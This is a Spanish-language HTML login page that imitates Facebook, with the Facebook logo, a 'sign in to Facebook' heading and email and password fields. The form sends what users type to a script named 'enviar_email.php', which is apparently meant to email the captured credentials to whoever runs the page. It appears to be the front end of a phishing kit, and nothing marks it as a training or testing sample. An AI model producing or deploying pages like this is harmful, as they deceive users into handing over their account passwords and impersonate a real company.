<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Mi Aplicación</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="facebook_logo.png" alt="Logo de Facebook" class="logo">
            <h2>Iniciar sesión en Facebook</h2>
        </div>
        <form action="enviar_email.php" method="POST" class="login-form">
            <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
            <div class="forgot-password">
                <a href="#">¿Olvidaste tu contraseña?</a>
            </div>
        </form>
        <div class="create-account">
            <a href="#">Crear cuenta nueva</a>
            <span> · </span>
            <a href="#">¿Necesitas ayuda?</a>
        </div>
    </div>
</body>
</html>
